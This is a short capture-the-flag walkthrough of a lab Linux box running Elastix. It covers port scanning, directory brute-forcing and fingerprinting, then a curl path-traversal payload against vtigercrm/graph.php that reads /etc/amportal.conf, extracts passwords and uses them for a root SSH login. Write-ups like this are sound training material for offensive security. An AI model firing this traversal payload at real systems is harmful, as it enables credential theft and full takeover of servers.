# Enum

```sh
ping 10.10.10.7
sudo nmap 10.10.10.7 -A -T5
```

```
64 bytes from 10.10.10.7: icmp_seq=23 ttl=63 time=438 ms

...

22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
110/tcp   open  pop3
111/tcp   open  rpcbind
143/tcp   open  imap
443/tcp   open  https
993/tcp   open  imaps
995/tcp   open  pop3s
3306/tcp  open  mysql
4445/tcp  open  upnotifyp
10000/tcp open  snet-sensor-mgmt
```

# First Sight

- TTL is 63; It may indicate that the target's OS is Linux.
- http server running.It seems starting with it is good idea.

# Gaining Access

```
# bruteforce directories
gobuster dir -u 10.10.10.7 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -b 302 -t 100 -o out.txt
```

```
# investigate web server.
sudo whatweb https://10.10.10.7
```

> https://10.10.10.7 [200 OK] Apache[2.2.3], Cookies[elastixSession], Country[RESERVED][zz], HTTPServer[CentOS][apache/2.2.3 (centos)], IP[10.10.10.7], PHP[5.1.6], PasswordField[input_pass], Script[text/javascript], Title[Elastix - Login page], X-Powered-By[PHP/5.1.6]

elastix is interesting. Let's try to exploit it.

```
searchsploit elastix
searchsploit -x 37637
searchsploit -m 37637
```

```
sudo curl 'http://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' -kL
# sudo curl 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' -k
```

It contains some credentials,grep them and save it in local file.

```
 sudo curl -sk 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action' | grep -i pass | cut -d = -f 2 | grep -v ^# | sort | uniq
```

Let's attemp to login with ssh and above creds.

```
ssh root@10.10.10.7
```
